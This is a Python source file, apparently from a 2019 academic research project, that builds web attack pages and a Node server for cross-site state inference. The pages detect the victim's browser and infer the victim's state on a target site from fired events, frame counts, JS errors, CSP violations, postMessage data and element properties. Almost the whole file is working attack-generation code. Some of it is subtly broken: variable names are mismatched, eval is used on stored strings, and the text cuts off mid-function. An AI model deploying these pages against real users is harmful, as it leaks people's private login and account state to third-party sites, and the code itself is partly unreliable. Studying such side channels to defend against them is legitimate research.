# -*- coding: utf-8 -*-

"""
	Copyright (C) 2019  Soheil Khodayari, IMDEA Software
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.
	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.

	Description:
	--------------
	New Attack Page Generator Script (Version 2)


	Usage:
	--------------
	> html_attack_page, server_program =  get_attack_page(siteId, target_state)
	
"""


from attack_vector_selection import select_attack_vectors

# --------------------------------------------------------------------- #
# 							Constants
# --------------------------------------------------------------------- #

# literal constants of leak method names in saved attack vectors
EVENTS_FIRED_LEAK_METHOD = "events_fired"
JS_ERRORS_LEAK_METHOD = "JSError"
OP_LEAK_METHOD = "ObjectProperties"
OP_FRAMECOUNT_LEAK_METHOD = "OPFrameCount"
CSP_LEAK_METHOD = "CSP"
JS_OBJECTS_READ_LEAK_METHOD = "JSObjectRead"
POST_MESSAGE_LEAK_METHOD = "PostMessage"

# --------------------------------------------------------------------- #

def _get_base_dom_document(document_title):
    document = '''
        <!DOCTYPE html>
        <html>
        <head>
                <title>%s</title>
                <meta charset="utf-8">
        </head>
        <body>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
        <script type="text/javascript">
        	
        	const CHROME_BROWSER = "chrome";	
    		const FIREFOX_BROWSER = "firefox";
    		const EDGE_BROWSER = "edge";
    		window.CHROME_BROWSER = CHROME_BROWSER;
    		window.FIREFOX_BROWSER = FIREFOX_BROWSER;
    		window.EDGE_BROWSER = EDGE_BROWSER;

    		/**
    		*	Detection of Victim Browser
    		*	Currently Only: Chrome, Edge, Firefox
    		**/
    		var getBrowserType = function(){

				let browser, userAgent = navigator.userAgent;

				if (userAgent.indexOf("Firefox") > -1) {
					browser = FIREFOX_BROWSER;
				} 
				else if (userAgent.indexOf("Edge") > -1) {
					browser = EDGE_BROWSER;
				} 
				else if (userAgent.indexOf("Chrome") > -1) {
					browser = CHROME_BROWSER;
				} 
				else {
					browser = "";
				}
				return browser;
    		}

    		var victimBrowser = getBrowserType();
    		window.victimBrowser = victimBrowser;
        </script>
        </body>
        </html>
        '''%(document_title)

    return document


def _include_tag_in_head(html, tag_as_string):

    head_idx = html.find("</head>")
    html_low_part = html[:head_idx]
    html_high_part = html[head_idx:]

    return html_low_part + tag_as_string + html_high_part

def _include_tag_in_body(html, tag_as_string):

    body_idx = html.rfind("</body>")
    html_low_part = html[:body_idx]
    html_high_part = html[body_idx:]

    return html_low_part + tag_as_string + html_high_part


def get_csp_header(tag_name, target_url, report_uri):
    if tag_name == "iframe" or tag_name == "frame":
        return "frame-src '%s' %s ; frame-ancestors '%s' %s"%('self', target_url, 'self', target_url)
    elif tag_name == "object":
        return "object-src '%s' %s"%('self', target_url)
    elif tag_name == "img":
        return "img-src '%s' %s"%('self', target_url)
    elif tag_name == "audio" or tag_name == "video":
        return "media-src '%s' %s"%('self',target_url)
    elif tag_name == "link":
        return "style-src '%s' %s"%('self',target_url)
    elif tag_name == "embed":
        return "child-src '%s' %s ; frame-ancestors '%s' %s"%('self', target_url, 'self', target_url)
    elif tag_name == "script":
        jquery_url = "https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"
        return "script-src 'unsafe-inline' '%s' %s %s"%('self', jquery_url, target_url)
    elif tag_name == "applet":
        return "frame-ancestors '%s' %s ; object-src '%s' %s"%('self', target_url, 'self', target_url)
    else:
        return ""

def get_csp_headers(headers, tag, target_url, report_uri="/record-data/csp/"):
    out = headers
    reportURIElement = "report-uri %s"%report_uri

    if len(headers):
        for i in range(len(out)):
            hdr = out[i]
            tagStartIndex = hdr.find(tag)
            if tagStartIndex != -1:
                tagIndex = tagStartIndex + len(tag)
                newHdr = hdr[:tagIndex+1] + " " + target_url + hdr[tagIndex:]
                out[i] = newHdr
                return out

        newHdr = get_csp_header(tag, target_url, report_uri)
        out.append(newHdr) 
    else:
        newHdr = get_csp_header(tag, target_url, report_uri)
        out.append(newHdr)

    if reportURIElement in out:
        out.remove(reportURIElement)
    out.append(reportURIElement)
    return out

# --------------------------------------------------------------------- #
#					  Main Server & Client Side
# --------------------------------------------------------------------- #


#  Creates the node server program for serving the attack pages 
def get_server_program(html, csp_headers, report_uri="/record-data/csp/", port="3000"):
    js = '''
    const express = require('express')
    var bodyParser = require('body-parser');
    const app = express()
    const path = require('path');
    const port = %s;
    // parse application/x-www-form-urlencoded
    app.use(bodyParser.urlencoded({ extended: false }))
    // parse application/json
    app.use(bodyParser.json())
    app.use(bodyParser.json({type: 'application/json'}));
    app.use(bodyParser.json({type: 'application/csp-report'}));

    var memory = {'violations': []};


    // -----------------------------------------------------------//
    //  @TODO:  replacce with your own configuration
    // -----------------------------------------------------------//

    // routes
    const endpoint_path = '/';
    const report_uri = '%s'
    const see_violations = '/get-state/csp/'
    const reset_memory = '/reset/csp/'
    // -----------------------------------------------------------//

    // allow CORS on this server
    app.all('/*', function(req, res, next) {
      res.header("Access-Control-Allow-Origin", "*");
      res.header("Access-Control-Allow-Headers", "*");
      res.header('Access-Control-Allow-Credentials', 'true');    
      res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
      next();
    });

    app.get(endpoint_path, (req, res) => {
        var csp_header = `%s`;
        var html = `%s`;
        res.setHeader("Content-Security-Policy", csp_header);
        return res.send(html);
    });

    app.post(report_uri, (req, res) => {
        // violation posted by browser
        var violationURL = req.body["csp-report"]["blocked-uri"];
        console.log(violationURL);
        memory.violations.push(violationURL);
        return res.send({"message":"violation recieved!"}).end();
   
    });

    app.get(see_violations, (req, res) => {

        return res.send(JSON.stringify(memory)).end();
    });

    app.get(reset_memory, (req, res) => {
        memory = {'violations': []};
        return res.send({"message":"temporary storage restarted"}).end();
    });

    app.listen(port, () => console.log(`Example app listening on port ${port}!`))
    '''%(port, report_uri, csp_headers, html)
    return js


def get_attack_page(siteId, target_state, report_uri="/record-data/csp/"):
	
	base_html = _get_base_dom_document("attack-page")
	html = base_html
	attack_vectors = select_attack_vectors(siteId, target_state)
	csp_headers = []
	timer_delay = 3000 # mili-seconds
	for i in range(len(attack_vectors)):
		av = attack_vectors[i]
		uuid = '_uid_%s'%i
		if av["LeakMethod"] == EVENTS_FIRED_LEAK_METHOD:
			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_order_index = av['TargetStateIndex']
			states_a_events= attack_dictionary["state_a_events"]
			states_b_events= attack_dictionary["state_b_events"]
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state

			tag = inclusion[1: inclusion.index(" ")].strip()
			html_inclusion = """
			<script type='text/javascript'>
			if(window.victimBrowser == "%s"){
				var div%s = document.createElement('div');
				div%s.innerHTML = "%s";
				var element%s = div%s.firstElementChild;
			
			"""%(browser, uuid, uuid, inclusion, uuid, uuid)
			for event in states_a_events:

				js_string="""
				element%s.%s = function(){
					window.event%s_triggered = true;
					console.log("logged-state: %s");
					alert("logged-state: %s");
				}
				"""%(uuid, str(event), uuid, str(states_a), str(states_a))
				html_inclusion = html_inclusion + js_string


			for event in states_b_events:
				js_string="""
				element%s.%s = function(){
					window.event%s_triggered = true;
					console.log("logged-state: %s");
					alert("logged-state: %s");
				}
				"""%(uuid, str(event), uuid, str(states_b), str(states_b))
				html_inclusion = html_inclusion + js_string

			if len(states_a_events) == 1:
				ev = states_a_events[0].strip()
				if ev == u'':
					js_no_event = """
						setTimeout(()=> {
							if(!window.event%s_triggered){
								console.log("logged-state: %s");
								alert("logged-state: %s");			
							}
						}, %s)
					"""%(uuid, str(states_a), str(states_a), timer_delay)
					html_inclusion = html_inclusion + js_no_event
					timer_delay = timer_delay + 500

			if len(states_b_events) == 1:
				ev = states_b_events[0].strip()
				if ev == u'':
					js_no_event = """
						setTimeout(()=> {
							if(!window.event%s_triggered){
								console.log("logged-state: %s");
								alert("logged-state: %s");			
							}
						}, %s)
					"""%(uuid, str(states_b), str(states_b), timer_delay)
					html_inclusion = html_inclusion + js_no_event
					timer_delay = timer_delay + 500

			js_end= """
			document.body.appendChild(div%s);
			}
			</script>
			"""%(uuid)
			html_inclusion = html_inclusion + js_end
			html = _include_tag_in_body(html, html_inclusion)

		if av["LeakMethod"] == OP_FRAMECOUNT_LEAK_METHOD:
			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_a_fc = attack_dictionary["state_a_data"]
			state_b_fc = attack_dictionary["state_b_data"]

			state_order_index = av['TargetStateIndex']
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state

			html_inclusion = """
			<script type='text/javascript'>
			if(window.victimBrowser == "%s"){
				var element%s = %s ;
				window.element%s = element%s ;
				setTimeout(()=> {
					if( window.element%s.length == (Number(%s)+1) ){
							console.log("logged-state: %s");
							alert("logged-state: %s");
					}else if ( window.element%s.length == (Number(%s)+1) ){
							console.log("logged-state: %s");
							alert("logged-state: %s");
					}
					window.element%s.close();
				}, %s);
			}
			</script>
			"""%(browser, uuid, inclusion, uuid, uuid, uuid, int(state_a_fc), str(states_a), str(states_a), 
			 uuid, int(state_b_fc), str(states_b), str(states_b), uuid, timer_delay+3000)
			html = _include_tag_in_body(html, html_inclusion)

		if av["LeakMethod"] == JS_ERRORS_LEAK_METHOD:
			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_a_errors = attack_dictionary["state_a_data"]
			state_b_errors = attack_dictionary["state_b_data"]

			state_order_index = av['TargetStateIndex']
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state

			if len(states_a_error) > 3: # window error exists
				html_inclusion = """
				%s
				<script type='text/javascript'>
				if(window.victimBrowser == "%s"){
	                window.onerror = function(){
	                    // Catch DOM Error Thrown by Included Resources.
	                    // This would mitigate the errors from preventing the javascript to get executed!
	                    window.window_onerror_%s_triggered = true;
	                    console.log("logged-state: %s");
						alert("logged-state: %s");
	                    return true;
	                }
	                setTimeout(()=> {
	                	if(!window.window_onerror_%s_triggered){
		                    console.log("logged-state: %s");
							alert("logged-state: %s");
	                	}
	                }, 1500)
				}
				</script>
				"""%(inclusion, browser, uuid, str(states_a), str(states_a), uuid, str(states_b), str(states_b))
			elif len(states_b_error) > 3:
				html_inclusion = """
				%s
				<script type='text/javascript'>
				if(window.victimBrowser == "%s"){
	                window.onerror = function(){
	                    // Catch DOM Error Thrown by Included Resources.
	                    // This would mitigate the errors from preventing the javascript to get executed!
	                    window.window_onerror_%s_triggered = true;
	                    console.log("logged-state: %s");
						alert("logged-state: %s");
	                    return true;
	                }
	                setTimeout(()=> {
	                	if(!window.window_onerror_%s_triggered){
		                    console.log("logged-state: %s");
							alert("logged-state: %s");
	                	}
	                }, 1500)
				}
				</script>
				"""%(inclusion, browser, uuid, str(states_b), str(states_b), uuid, str(states_a), str(states_a))

			html = _include_tag_in_body(html, html_inclusion)

		if av["LeakMethod"] == JS_OBJECTS_READ_LEAK_METHOD:
			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_a_data = attack_dictionary["state_a_data"]
			state_b_data = attack_dictionary["state_b_data"]

			state_order_index = av['TargetStateIndex']
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state


			html_inclusion = """
			%s
			<script type='text/javascript'>
			if(window.victimBrowser == "%s"){
				function simpleStringify (object){
				    var simpleObject = { };
				    for (var prop in object ){
				        if (typeof(object[prop]) == 'object'){
				            continue;
				        }
				        if (typeof(object[prop]) == 'function'){
				            continue;
				        }
				        simpleObject[prop] = object[prop];
				    }
				    return JSON.stringify(simpleObject); // returns cleaned up JSON
				};
				var logged_variables = Object.keys(window).filter(x => typeof(window[x]) !== 'function' &&
				  Object.entries(
				    Object.getOwnPropertyDescriptor(window, x)).filter(e =>
				      ['value', 'writable', 'enumerable', 'configurable'].includes(e[0]) && e[1]
				    ).length === 4);
				var vresults_%s=[];
				for(var i=0; i< logged_variables.length;i++){
				    var logValue = window[logged_variables[i]];
				    var logValueString= '';
				    if(logValue == undefined){
				        logValueString= "undefined";
				    }else if(logValue == null){
				        logValueString= "null";
				    }else{
				        logValueString= simpleStringify(logValue);
				    }
				    vresults_%s.push(logged_variables[i]+":::"+logValueString);

				  }
				window.vresults_%s= JSON.stringify(vresults_%s);
				if(window.vresults_%s == "%s"){
                    console.log("logged-state: %s");
					alert("logged-state: %s");
				}else if(window.vresults_%s == "%s"){
				    console.log("logged-state: %s");
					alert("logged-state: %s");
				}else{
					console.log("unknown state!")
				}
			}
			</script>
			"""%(inclusion, browser, uuid, uuid, uuid, uuid, uuid, state_a_data, str(states_a), str(states_a),
				state_b_data, str(states_b), str(states_b))

			html = _include_tag_in_body(html, html_inclusion)
		if av["LeakMethod"] == CSP_LEAK_METHOD:

			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_a_data = attack_dictionary["state_a_data"]
			state_b_data = attack_dictionary["state_b_data"]

			state_order_index = av['TargetStateIndex']
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state


			tag = inclusion[1: inclusion.index(" ")].strip()
			inclusion_url = attack_dictionary["url"]
			csp_headers = get_csp_headers(csp_headers, tag, inclusion_url, report_uri)

			# include the policy (if not rendered with server)
			# csp_policy = attack_dictionary['csp_policy']
			# csp_meta_tag = """
			# <meta http-equiv="Content-Security-Policy" content="%s">
			# """%(csp_policy)
			# html = _include_tag_in_head(html, csp_meta_tag)

			# include the violating tag
			html = _include_tag_in_body(html, inclusion) 

			html_inclusion = """
			<script type='text/javascript'>
			/* CSP violation Technique */
			document.addEventListener("securitypolicyviolation", function(e) {
	    			window.violationURL = e.blockedURI;
	    			window.violationOccured = true;

	    			setTimeout(()=> {
		    			if(victimBrowser == "%s"){
		    				let violationData_A = "%s";
		    				let violationData_B = "%s";
			    			if(violationData_A.includes(window.violationURL)){
							    console.log("logged-state: %s");
								alert("logged-state: %s");	
			    			}else if(violationData_B.includes(window.violationURL)){
							    console.log("logged-state: %s");
								alert("logged-state: %s");	
			    			}else{
			    				console.log("Unknown state, blocked violated URL by CSP: "+ window.violationURL )
			    			}
		    			}
	    			}, 2000)
			});
			setTimeout(()=> {
				if(!window.violationOccured){
    				let violationData_A = "%s";
    				violationData_A = violationData_A.replace(/NO_VIOLATION/g, "");
    				let violationData_B = "%s";
					violationData_B = violationData_B.replace(/NO_VIOLATION/g, "");
					if(violationData_A.length > 4){
					    console.log("logged-state: %s");
						alert("logged-state: %s");	
					}else if(violationData_B.length > 4) {
					    console.log("logged-state: %s");
						alert("logged-state: %s");			
					}
				}
			}, 4000);	
			</script>
			%s
			"""%(browser, state_a_data, state_b_data, str(states_a), str(states_a), str(states_b), str(states_b), 
				state_a_data, state_b_data, str(states_a), str(states_a), str(states_b), str(states_b), inclusion)

			html = _include_tag_in_body(html, html_inclusion)

		if av["LeakMethod"] == POST_MESSAGE_LEAK_METHOD:

			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_a_data = attack_dictionary["state_a_data"]
			state_b_data = attack_dictionary["state_b_data"]

			state_order_index = av['TargetStateIndex']
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state

			jaro_distance = """
			<script type="text/javascript">

			/* 
			@Thanks to https://github.com/thsig/jaro-winkler-JS/blob/master/jaro_winkler.js
			@Params a and b should be strings. 
			@Note always performs case-insensitive comparisons
			and always adjusts for long strings. 
			*/

			var jaro_winkler = { };
			jaro_winkler.distance = function(a, b) {

			  if (!a || !b) { return 0.0; }

			  a = a.trim().toUpperCase();
			  b = b.trim().toUpperCase();
			  var a_len = a.length;
			  var b_len = b.length;
			  var a_flag = []; var b_flag = [];
			  var search_range = Math.floor(Math.max(a_len, b_len) / 2) - 1;
			  var minv = Math.min(a_len, b_len);

			  // Looking only within the search range, count and flag the matched pairs. 
			  var Num_com = 0;
			  var yl1 = b_len - 1;
			  for (var i = 0; i < a_len; i++) {
			    var lowlim = (i >= search_range) ? i - search_range : 0;
			    var hilim  = ((i + search_range) <= yl1) ? (i + search_range) : yl1;
			    for (var j = lowlim; j <= hilim; j++) {
			      if (b_flag[j] !== 1 && a[j] === b[i]) {
			        a_flag[j] = 1;
			        b_flag[i] = 1;
			        Num_com++;
			        break;
			      }
			    }
			  }

			  // Return if no characters in common
			  if (Num_com === 0) { return 0.0; }

			  // Count the number of transpositions
			  var k = 0; var N_trans = 0;
			  for (var i = 0; i < a_len; i++) {
			    if (a_flag[i] === 1) {
			      var j;
			      for (j = k; j < b_len; j++) {
			        if (b_flag[j] === 1) {
			          k = j + 1;
			          break;
			        }
			      }
			      if (a[i] !== b[j]) { N_trans++; }
			    }
			  }
			  N_trans = Math.floor(N_trans / 2);

			  // Adjust for similarities in nonmatched characters
			  var N_simi = 0; var adjwt = jaro_winkler.adjustments;
			  if (minv > Num_com) {
			    for (var i = 0; i < a_len; i++) {
			      if (!a_flag[i]) {
			        for (var j = 0; j < b_len; j++) {
			          if (!b_flag[j]) {
			            if (adjwt[a[i]] === b[j]) {
			              N_simi += 3;
			              b_flag[j] = 2;
			              break;
			            }
			          }
			        }
			      }
			    }
			  }

			  var Num_sim = (N_simi / 10.0) + Num_com;

			  // Main weight computation
			  var weight = Num_sim / a_len + Num_sim / b_len + (Num_com - N_trans) / Num_com;
			  weight = weight / 3;

			  // Continue to boost the weight if the strings are similar
			  if (weight > 0.7) {
			    // Adjust for having up to the first 4 characters in common
			    var j = (minv >= 4) ? 4 : minv;
			    var i;
			    for (i = 0; (i < j) && a[i] === b[i]; i++) { }
			    if (i) { weight += i * 0.1 * (1.0 - weight) };

			    // Adjust for long strings.
			    // After agreeing beginning chars, at least two more must agree
			    // and the agreeing characters must be more than half of the
			    // remaining characters.
			    if (minv > 4 && Num_com > i + 1 && 2 * Num_com >= minv + i) {
			      weight += (1 - weight) * ((Num_com - i - 1) / (a_len * b_len - i*2 + 2));
			    }
			  }

			  return weight
			  
			};

			// The char adjustment table used above
			jaro_winkler.adjustments = {
			  'A': 'E',
			  'A': 'I',
			  'A': 'O',
			  'A': 'U',
			  'B': 'V',
			  'E': 'I',
			  'E': 'O',
			  'E': 'U',
			  'I': 'O',
			  'I': 'U',
			  'O': 'U',
			  'I': 'Y',
			  'E': 'Y',
			  'C': 'G',
			  'E': 'F',
			  'W': 'U',
			  'W': 'V',
			  'X': 'K',
			  'S': 'Z',
			  'X': 'S',
			  'Q': 'C',
			  'U': 'V',
			  'M': 'N',
			  'L': 'I',
			  'Q': 'O',
			  'P': 'R',
			  'I': 'J',
			  '2': 'Z',
			  '5': 'S',
			  '8': 'B',
			  '1': 'I',
			  '1': 'L',
			  '0': 'O',
			  '0': 'Q',
			  'C': 'K',
			  'G': 'J',
			  'E': ' ',
			  'Y': ' ', 
			  'S': ' '
			}
			window.jaro_winkler = jaro_winkler;
			</script>
			"""
			html = _include_tag_in_body(html, jaro_distance)
			if "window.open" in inclusion:
				html_inclusion = """
				<script type='text/javascript'>
				if(window.victimBrowser == "%s"){
					var win_%s = %s ;
					window.rcvd_messages = [];
					function receiveMessageListener(event){
						var opentype = "frame"; 
						var message = JSON.stringify({ "opentype": opentype, "messageData": event.data, "messageOrigin": event.origin});
						window.rcvd_messages.push(message);
					}
					setTimeout(()=> {
						let str_messages = "" + window.rcvd_messages;
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						// use jaro similarity message distance
						score_a = window.jaro_winkler.distance(str_messages, state_a_messages);
						score_b = window.jaro_winkler.distance(str_messages, state_b_messages);
						if(score_a > score_b){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						}else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						}

					}, 7000);
				}
				</script>
				"""%(browser, uuid, inclusion, state_a_data, state_b_data, str(states_a), str(states_a), str(states_b), str(states_b))
			else:
				html_inclusion = """
				%s
				<script type='text/javascript'>
				if(window.victimBrowser == "%s"){
					window.rcvd_messages = [];
					function receiveMessageListener(event){
						var opentype = "frame"; 
						var message = JSON.stringify({ "opentype": opentype, "messageData": event.data, "messageOrigin": event.origin});
						window.rcvd_messages.push(message);
					}
					setTimeout(()=> {
						let str_messages = "" + window.rcvd_messages;
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						// use jaro similarity message distance
						score_a = window.jaro_winkler.distance(str_messages, state_a_messages);
						score_b = window.jaro_winkler.distance(str_messages, state_b_messages);
						if(score_a > score_b){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						}else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						}
					}, 7000);
				}
				</script>
				"""%(inclusion, browser, state_a_data, state_b_data, str(states_a), str(states_a), str(states_b), str(states_b))	

			html = _include_tag_in_body(html, html_inclusion)		

		if av["LeakMethod"] == OP_LEAK_METHOD:
			attack_dictionary = eval(av["Inclusion"])
			inclusion = attack_dictionary['inclusion'].strip()
			browser = av["Browser"].lower()
			state_a_data = attack_dictionary["state_a_data"]
			state_b_data = attack_dictionary["state_b_data"]

			state_order_index = av['TargetStateIndex']
			if state_order_index == 0:
				states_a = av["States"][0] # target_state
				states_b = av["States"][1]
			else:
				states_a = av["States"][1]
				states_b = av["States"][0]  # target_state
			tag = inclusion[1: inclusion.index(" ")].strip()
			base_js = '''
				<script type="text/javascript">
				function convertToText(obj) {
					if(typeof(obj) == undefined) return "undefined"
					if(obj == null) return "null"
				    //create an array that will later be joined into a string.
				    var string = []
				    //is object
				    //    Both arrays and objects seem to return "object"
				    //    when typeof(obj) is applied to them. So instead
				    //    I am checking to see if they have the property
				    //    join, which normal objects don't have but
				    //    arrays do.
				    if (typeof(obj) == "object" && (obj.join == undefined)) {
				        string.push("{");
				        for (prop in obj) {
				            string.push(prop, ": ", convertToText(obj[prop]), ",");
				        };
				        string.push("}");

				    //is array
				    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
				        string.push("[")
				        for(prop in obj) {
				            string.push(convertToText(obj[prop]), ",");
				        }
				        string.push("]")

				    //is function
				    } else if (typeof(obj) == "function") {
				        string.push(obj.toString())

				    //all other values can be done with JSON.stringify
				    } else {
				        string.push(JSON.stringify(obj))
				    }

				    return string.join("")
				}
			'''
			js = base_js
			if tag == "object":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;

					setTimeout(()=> { 
						var props%s = { };
						props%s.contentDocument = (window.element%s.contentDocument)? new XMLSerializer().serializeToString(window.element%s.contentDocument) : convertToText(window.element%s.contentDocument);
						// props%s.contentDocument = (window.element%s.contentDocument)? "document": window.element%s.contentDocument;
						props%s.contentWindowLength = (window.element%s.contentWindow)? window.element%s.contentWindow.length: "null";
						// props%s.form = (window.element%s.form)? "HTMLFormElement": window.element%s.form;
						props%s.form = convertToText(window.element%s.form);
						props%s.validity = convertToText(window.element%s.validity);
						props%s.willValidate = convertToText(window.element%s.willValidate);
						props%s.validationMessage = convertToText(window.element%s.validationMessage);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "video" or tag == "audio" or tag == "videoPoster":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;

					setTimeout(()=> { 
						var props%s = { };
						
						props%s.duration = convertToText(window.element%s.duration);
						props%s.readyState = convertToText(window.element%s.readyState);
						props%s.volume = convertToText(window.element%s.volume);
						props%s.textTracks = convertToText(window.element%s.textTracks);
						props%s.audioTracks = convertToText(window.element%s.audioTracks);
						props%s.videoTracks = convertToText(window.element%s.videoTracks);
						props%s.seeking = convertToText(window.element%s.seeking);
						props%s.seekable = convertToText(window.element%s.seekable);
						props%s.preload = convertToText(window.element%s.preload);
						props%s.played = convertToText(window.element%s.played);
						props%s.paused = convertToText(window.element%s.paused);
						props%s.playbackRate = convertToText(window.element%s.playbackRate);
						props%s.networkState = convertToText(window.element%s.networkState);
						props%s.muted = convertToText(window.element%s.muted);
						props%s.mediaGroup = convertToText(window.element%s.mediaGroup);
						props%s.error = convertToText(window.element%s.error);
						props%s.ended = convertToText(window.element%s.ended);
						props%s.currentTime = convertToText(window.element%s.currentTime);
						props%s.buffered = convertToText(window.element%s.buffered);
						props%s.loop = convertToText(window.element%s.loop);
						props%s.autoplay = convertToText(window.element%s.autoplay);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "source":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					window.elementSource%s = window.element%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						
						props%s.duration = convertToText(window.element%s.duration);
						props%s.readyState = convertToText(window.element%s.readyState);
						props%s.volume = convertToText(window.element%s.volume);
						props%s.textTracks = convertToText(window.element%s.textTracks);
						props%s.audioTracks = convertToText(window.element%s.audioTracks);
						props%s.videoTracks = convertToText(window.element%s.videoTracks);
						props%s.seeking = convertToText(window.element%s.seeking);
						props%s.seekable = convertToText(window.element%s.seekable);
						props%s.preload = convertToText(window.element%s.preload);
						props%s.played = convertToText(window.element%s.played);
						props%s.paused = convertToText(window.element%s.paused);
						props%s.playbackRate = convertToText(window.element%s.playbackRate);
						props%s.networkState = convertToText(window.element%s.networkState);
						props%s.muted = convertToText(window.element%s.muted);
						props%s.mediaGroup = convertToText(window.element%s.mediaGroup);
						props%s.error = convertToText(window.element%s.error);
						props%s.ended = convertToText(window.element%s.ended);
						props%s.currentTime = convertToText(window.element%s.currentTime);
						props%s.buffered = convertToText(window.element%s.buffered);
						props%s.loop = convertToText(window.element%s.loop);
						props%s.autoplay = convertToText(window.element%s.autoplay);
						props%s.media = convertToText(elementSource%s.media); 
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "track":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					window.elementTrack%s = window.element%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.duration = convertToText(element%s.duration);
						props%s.readyState = convertToText(element%s.readyState);
						props%s.volume = convertToText(element%s.volume);
						props%s.textTracks = convertToText(element%s.textTracks);
						props%s.audioTracks = convertToText(element%s.audioTracks);
						props%s.videoTracks = convertToText(element%s.videoTracks);
						props%s.seeking = convertToText(element%s.seeking);
						props%s.seekable = convertToText(element%s.seekable);
						props%s.preload = convertToText(element%s.preload);
						props%s.played = convertToText(element%s.played);
						props%s.paused = convertToText(element%s.paused);
